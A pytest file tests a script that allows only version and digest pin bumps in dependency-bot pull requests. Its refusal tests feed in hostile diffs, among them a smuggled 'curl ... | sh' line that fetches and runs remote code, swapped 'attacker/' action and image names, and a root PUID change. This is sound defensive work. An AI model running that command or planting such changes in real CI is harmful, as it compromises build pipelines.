"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import subprocess

import pytest

from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

DIGEST = "sha256:" + "a" * 64


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["python3", str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
    )


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version or digest moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_an_image_version_and_digest_bump():
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n"
            f"+PROMETHEUS_VERSION=v3.7.4@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_pip_pin_bump_inside_a_workflow_run_step():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_first_time_digest_pin():
    # pinDigests adds a digest to a line that had none, so the two sides differ
    # by its presence. Refusing that would block every pin Renovate creates.
    result = _check(
        _diff(
            ".env.example",
            f"-PROMETHEUS_VERSION=v3.7.3\n+PROMETHEUS_VERSION=v3.7.3@{DIGEST}\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v0.16.1\n+    rev: v0.16.2\n",
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-          pip install checkov==3.3.2\n"
            "+          pip install checkov==3.3.11\n"
            "+          curl -s https://example.invalid/x.sh | sh\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-        uses: actions/checkout@v7\n+        uses: attacker/checkout@v7\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    result = _check(
        _diff(
            "docker-compose-torrent.yml",
            "-    image: lscr.io/linuxserver/sonarr:4.0.19\n"
            "+    image: lscr.io/linuxserver/sonarr:4.0.20\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    result = _check(
        "diff --git a/tests/requirements.txt b/tests/requirements-old.txt\n"
        "--- a/tests/requirements.txt\n"
        "+++ b/tests/requirements-old.txt\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout


# ---------------------------------------------------------------------------
# Fails closed: the ways an unreadable diff could have passed for a clean one
# ---------------------------------------------------------------------------


def test_refuses_output_with_no_file_header():
    # Truncated or binary output parses into no files at all. Reporting that as
    # "nothing to object to" would approve a diff nobody managed to read.
    result = _check("Binary files a/x.png and b/x.png differ\n")
    assert result.returncode == 1
    assert "no file headers" in result.stdout


def test_refuses_a_file_whose_lines_could_not_be_read():
    result = _check(
        "diff --git a/.env.example b/.env.example\nindex 1111111..2222222 100644\n"
    )
    assert result.returncode == 1
    assert "no readable changed lines" in result.stdout


def test_counts_an_added_line_that_looks_like_a_file_header():
    # `+++x` inside a hunk is an added line reading `++x`. Skipping it as a
    # ---/+++ header would drop it from the comparison, so the smuggled line
    # would never be seen.
    result = _check(
        _diff(
            ".env.example",
            "-PROMETHEUS_VERSION=v3.7.3\n"
            "+PROMETHEUS_VERSION=v3.7.4\n"
            "+++PATH=/tmp/evil\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


# ---------------------------------------------------------------------------
# Only a number in a pin position counts as a version
# ---------------------------------------------------------------------------


def test_refuses_a_numeric_change_that_is_not_a_pin():
    # PUID=0 would run every container as root, and it is a digit change on a
    # line in an allowed file, so a rule that normalized any number would have
    # accepted it.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_refuses_a_changed_yaml_number():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-    timeout-minutes: 25\n+    timeout-minutes: 600\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_pin_that_changes_shape_rather_than_value():
    result = _check(
        _diff(
            "tests/requirements.txt",
            "-pytest==8.4.1\n+pytest>=8.4.1\n",
        )
    )
    assert result.returncode == 1


def test_accepts_a_hash_style_tag():
    # linuxserver publishes lazylibrarian as a commit hash with a build suffix,
    # not as dotted numbers. Refusing that meant refusing a real bump, which is
    # what happened to #62.
    result = _check(
        _diff(
            ".env.example",
            # pragma: allowlist secret - an image tag, and the hash in it is
            # what detect-secrets reads as entropy. It is published on Docker
            # Hub.
            "-LAZYLIBRARIAN_VERSION=40a389ea-ls309\n"  # pragma: allowlist secret
            "+LAZYLIBRARIAN_VERSION=40a389ea-ls310\n",  # pragma: allowlist secret
        )
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_non_pin_number_after_widening_the_token():
    # The widened token must not start accepting numbers that are not pins.
    result = _check(_diff(".env.example", "-PUID=1000\n+PUID=0\n"))
    assert result.returncode == 1


def test_accepts_a_sha_prefixed_tag():
    # korsync is pinned to `sha-<hash>`, so the token cannot be required to
    # start with a digit. Requiring one refused this form.
    old = "sha-7bcefd34e9f6738ce34ccda338aedd316baa05c9"  # pragma: allowlist secret
    new = "sha-8adf1129c7a0d51e0b2a7f4e93a1b0c5d6e7f809"  # pragma: allowlist secret
    result = _check(
        _diff(".env.example", f"-KORSYNC_VERSION={old}\n+KORSYNC_VERSION={new}\n")
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_floating_tag_change():
    result = _check(
        _diff(".env.example", "-NGINX_VERSION=stable-alpine\n+NGINX_VERSION=stable\n")
    )
    assert result.returncode == 0, result.stdout


def test_still_refuses_a_swapped_image_name_with_the_widest_token():
    # The name sits left of the prefix and stays literal, which is what keeps
    # the permissive token safe.
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-        entry: docker run aquasec/trivy:0.71.2\n"
            "+        entry: docker run attacker/trivy:0.71.2\n",
        )
    )
    assert result.returncode == 1
